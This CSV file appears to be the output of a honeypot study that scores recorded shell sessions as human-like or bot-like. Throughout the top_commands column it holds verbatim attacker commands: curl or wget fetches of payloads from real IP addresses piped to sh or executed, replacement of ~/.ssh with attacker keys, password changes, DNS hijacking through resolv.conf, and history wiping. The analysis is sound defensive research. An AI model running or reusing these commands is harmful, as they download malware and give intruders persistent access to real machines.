session,combo_key,label_pdf_quantile,label_tailtest,label_posterior,p_human_tail,p_human_posterior,n_pairs,n_commands,first_cmd,last_cmd,top_commands,logp_human_global
20f796c9376a,True_True_False,human_like,human_like,ambiguous,0.2535903887163198,0.4998452255305152,19,22,touch file,uname -a,touch file | ssh admin@23ouywifuhfsdhf | cd ../admin | cd /home/admin | ls -lrt | ps | ps -eaf | ps -fead,-3.000269766137071
61ebdd0a4b36,True_True_False,human_like,human_like,ambiguous,0.4663607003378535,0.8564496881882021,3,4,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | echo Hi | cat -n,-2.115397423107834
0645694415d2,True_True_False,human_like,human_like,ambiguous,0.1994834286230908,0.3134801327459654,24,26,curl,history -c,curl | uname -a | curl http://xtibh.com/d/EER6Es | sh | ps aux | ps aux | grep curl | ps aux | mount | uname -a,-3.324967438344713
b269844f934b,True_True_False,human_like,human_like,ambiguous,0.5094034777999725,0.8348261254192633,23,25,cat /etc/rsyslog.conf,ls -l /home/phil,cat /etc/rsyslog.conf | cat /etc/login.defs | history | cat /etc/hosts | cat /etc/hosts | cat /etc/hostname | hostname | find /,-1.9757230705617783
2b058889c060,True_True_False,human_like,human_like,ambiguous,0.1982023960354473,0.8128980004177856,21,25,uname- a,ls -l /etc,uname- a | uname -a | pwd | ls /root | ls /home | id | awk | pwd,-3.3335559149502094
d63a514c15d3,True_True_False,human_like,human_like,ambiguous,0.1059735125224123,0.1251968729029376,4,5,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | echo Hi | cat -n,-4.143853077208314
5222b4b0ad7c,True_True_False,human_like,human_like,ambiguous,0.1980106969445543,0.8779895583202485,8,9,cat /proc/net/arp,pwd,cat /proc/net/arp | ls /proc/net | pwd | cd /proc | ls -l | ifconfig -a | uname -a | mount,-3.334845373842534
2d22c276a3f0,True_True_False,human_like,human_like,ambiguous,0.102025461400095,0.3876967692018913,16,18,w,rm -rf .reload,w | wget | nano | nano aa | ls -a | cd /usr | ls -a | wget https://bashupload.com/4vQyv/reload.tgz,-4.191705670985144
ab4a2a5d7d34,True_True_False,human_like,human_like,ambiguous,0.2129778605228414,0.7240563776538276,13,14,w,ls -a,w | cat /pro/cpuinfo | cat /proc/cpuinfo | uname -a | yum install screen | yum install *lib* | yum update | passwd,-3.237350006497413
53c9d44086cc,False_True_False,uncertain,human_like,ambiguous,0.0677980418282099,0.8501555337667817,7,9,free -m,passwd,free -m | passwd | passwd | passwd | help | clear | git clone https://github.com/vanhauser-thc/thc-hydra | git https://github.com/vanhauser-thc/thc-hydra,-4.699728503826556
c691f2aa053d,False_True_False,uncertain,human_like,bot_posterior_high,0.0644107778997671,0.011432162756986,17,19,cd ~; chattr -ia .ssh; lockr -ia .ssh,df -h | head -n 2 | awk 'FNR == 2 {print $2; }',"cd ~; chattr -ia .ssh; lockr -ia .ssh | cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1... | cat /proc/cpuinfo | grep name | wc -l | echo -e ""admin\ngyymh62hAS8k\ngyymh62hAS8k"" | passwd | bash | echo ""admin\ngyymh62hAS8k\ngyymh62hAS8k\n"" | passwd | cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9; }' | free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}' | ls -lh $(which ls)",-4.762618773680036
1ca21cbba327,False_True_False,uncertain,human_like,ambiguous,0.0662890294810069,0.5523357127125688,9,11,ls -l,ls -lrt,"ls -l | wget ipinfo.io/ip | cat ip | ls -lrt | ls -l | uname | echo ""."" | while",-4.72736900577097
930021e821f1,False_True_False,uncertain,human_like,bot_posterior_high,0.0503107034004133,0.0962423086689286,4,5,ifconfig,echo Hi | cat -n,ifconfig | uname -a | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | echo Hi | cat -n,-5.063572466417354
888de80e3b84,False_False_True,non_human_like,non_human_like,human_posterior_high,0.0,0.9003953035378822,3,4,id;,help; ?; ; ;,id; | help; ?; ; ; | id; | help; ?; ; ;,-48.222220720032915
cf03edfdfe14,False_False_True,uncertain,non_human_like,human_posterior_high,0.0028563517647601,0.999144530805966,8,9,ls -rlt,nc -vv 107.23.254.247.214 80,ls -rlt | ls -lrt | ls -lrta | touch file | ls -lrt | curl https://www.viessmann.co.uk | nc | nc -vv 208,-8.389546808036252
4f9734961cec,False_False_True,non_human_like,non_human_like,human_posterior_high,2.112754415861673e-12,0.9901442502510416,3,4,ifconfig,echo Hi | cat -n,ifconfig | uname -a | ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect... | echo Hi | cat -n,-30.65473963644871
8c71dc7bc3e8,False_False_True,non_human_like,non_human_like,human_posterior_high,0.0,0.904839786666386,3,4,id;,help; ?; ; ;,id; | help; ?; ; ; | id; | help; ?; ; ;,-46.16802167746739
b8c285cdc6f4,False_True_True,uncertain,human_like,human_posterior_high,0.0643256336656106,0.9907700344083564,3,4,"echo ""paul coxtesting",exit,"echo ""paul coxtesting | echo ""paul cox txtesting"" | cat /etc/hostname | exit",-4.764239717117175
2a67d5b15812,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,3.814937105297372e-52,3,5,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | echo 'nameserver 95.214.27.202'>/etc/resolv.conf; | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-114.998583836452
792ba473c8a8,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.5773239532899082e-45,4,6,cat /bin/echo,wget --help>/dev/null && echo -en '\x57\x47\x45\x54'; curl --help>/dev/null && echo -en '\x43\x55\x52\x4c'; echo -en '\x...,cat /bin/echo | cat /proc/mounts | echo -e '\x72\x70\x70\x72/dev' > /dev/.dabag; cat /dev/.dabag; rm /dev/.dabag | echo -e '\x4d\x4f\x55\x4e\x54\x53\x5f\x44\x4f\x4e\x45' | rm -f /dev/.d; rm -f /dev/.f; >/dev/.d; (chmod 777 /dev/.d || cp /bin/echo /dev/.d; >/dev/.d); cp /dev/.d /dev/.f | wget --help>/dev/null && echo -en '\x57\x47\x45\x54'; curl --help>/dev/null && echo -en '\x43\x55\x52\x4c'; echo -en '\x...,-101.09858577719532
dca985845b3c,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,2.493451409398148e-77,9,11,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM...",wget http://109.206.243.207/ssh/x86_64 -O-> .i || busybox wget http://109.206.243.207/ssh/x86_64 -O-> .i || wd1 http://1...,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM... | cp /bin/echo /home/.z && >/home/.z && cd /home/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /tmp/.z && >/tmp/.z && cd /tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/tmp/.z && >/var/tmp/.z && cd /var/tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /home/$USER/.z && >/home/$USER/.z && cd /home/$USER/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 77... | cp /bin/echo /dev/.z && >/dev/.z && cd /dev/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/.z && >/var/.z && cd /var/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /etc/.z && >/etc/.z && cd /etc/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d;",-168.44790969956435
1f49885f065e,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,2.9432162718199156e-72,11,15,sh,wget http://95.214.27.202/x86_64 -O-> .i || busybox wget http://95.214.27.202/x86_64 -O-> .i || wd1 http://95.214.27.202...,"sh | shell | enable | cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM... | mkdir /home/; mount -o remount, rw /home/; cp /bin/echo /home/.z && >/home/.z && cd /home/; rm -rf .i; cp .z .i; cp .i .... | mkdir /tmp/; mount -o remount, rw /tmp/; cp /bin/echo /tmp/.z && >/tmp/.z && cd /tmp/; rm -rf .i; cp .z .i; cp .i .d; ch... | mkdir /var/tmp/; mount -o remount, rw /var/tmp/; cp /bin/echo /var/tmp/.z && >/var/tmp/.z && cd /var/tmp/; rm -rf .i; cp... | mkdir /home/$USER/; mount -o remount, rw /home/$USER/; cp /bin/echo /home/$USER/.z && >/home/$USER/.z && cd /home/$USER/...",-157.08530152585706
b60637083cd8,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,2.644708451505576e-41,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-80.24265316797512
15b67af6983f,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.3321595189503461e-51,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-103.22739080932328
40a1a9eeba1e,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,2.173584399235164e-34,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-66.01926405565816
a0e251db304f,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,6.654203589469242e-36,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-68.29275782035643
a4b5b82673c0,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,7.978818884416794e-22,6,7,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect... | echo Hi | cat -n,-42.53809132814292
6cf11c78d01f,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,2.813928223033187e-47,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-94.5060553192065
a2271aa921be,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.3391065865008029e-52,3,5,echo 1 > /dev/null && cat /bin/echo,>A@/1'8ELF7},"echo 1 > /dev/null && cat /bin/echo | nohup $SHELL -c ""curl http://47.239.42.214:60123/linux -o /tmp/nEpLjNjJ9s; if [ ! -f /tmp/nEpLjNjJ9s ]; then wget http:/... | head -c 3800636 > /tmp/CTPl7hzWFZ | nohup $SHELL -c ""curl http://47.239.42.214:60123/linux -o /tmp/nEpLjNjJ9s; if [ ! -f /tmp/nEpLjNjJ9s ]; then wget http:/... | >A@/1'8ELF7}",-118.53410381046947
42a77e00cff6,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.9931006127119053e-43,4,6,cat /bin/echo,wget --help>/dev/null && echo -en '\x57\x47\x45\x54'; curl --help>/dev/null && echo -en '\x43\x55\x52\x4c'; echo -en '\x...,cat /bin/echo | cat /proc/mounts | echo -e '\x72\x70\x70\x72/dev' > /dev/.dabag; cat /dev/.dabag; rm /dev/.dabag | echo -e '\x4d\x4f\x55\x4e\x54\x53\x5f\x44\x4f\x4e\x45' | rm -f /dev/.d; rm -f /dev/.f; >/dev/.d; (chmod 777 /dev/.d || cp /bin/echo /dev/.d; >/dev/.d); cp /dev/.d /dev/.f | wget --help>/dev/null && echo -en '\x57\x47\x45\x54'; curl --help>/dev/null && echo -en '\x43\x55\x52\x4c'; echo -en '\x...,-96.29707791622732
f622ad21e3ab,False_False_False,non_human_like,non_human_like,bot_posterior_high,2.910748087003867e-09,5.4484969525698214e-14,5,7,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect... | echo Hi | cat -n,-23.152826753910723
12574832f5e4,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,4.022884539957996e-22,6,7,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect... | echo Hi | cat -n,-43.68858894409195
5da4c92497e4,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.7500644845552262e-61,5,7,cat /bin/echo,cd /dev; wget http://95.214.27.202/x86 -O- >.f; ./.f ssh.wget.x86; >.f; echo rppr,cat /bin/echo | cat /proc/mounts | echo -e '\x72\x70\x70\x72/dev' > /dev/.dabag; cat /dev/.dabag; rm /dev/.dabag | echo -e '\x4d\x4f\x55\x4e\x54\x53\x5f\x44\x4f\x4e\x45' | rm -f /dev/.d; rm -f /dev/.f; >/dev/.d; (chmod 777 /dev/.d || cp /bin/echo /dev/.d; >/dev/.d); cp /dev/.d /dev/.f | wget --help>/dev/null && echo -en '\x57\x47\x45\x54'; curl --help>/dev/null && echo -en '\x43\x55\x52\x4c'; echo -en '\x... | cd /dev; wget http://95.214.27.202/x86 -O- >.f; ./.f ssh.wget.x86; >.f; echo rppr,-137.9460323415036
bbdb476cd7b4,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.24046560723158e-54,3,5,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | echo 'nameserver 95.214.27.202'>/etc/resolv.conf; | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-119.1633186403506
ee6ae8a68923,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,4.31563671401535e-53,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-106.89494373073752
7cd6070598ef,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,5.815958223931993e-35,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-66.49397706330343
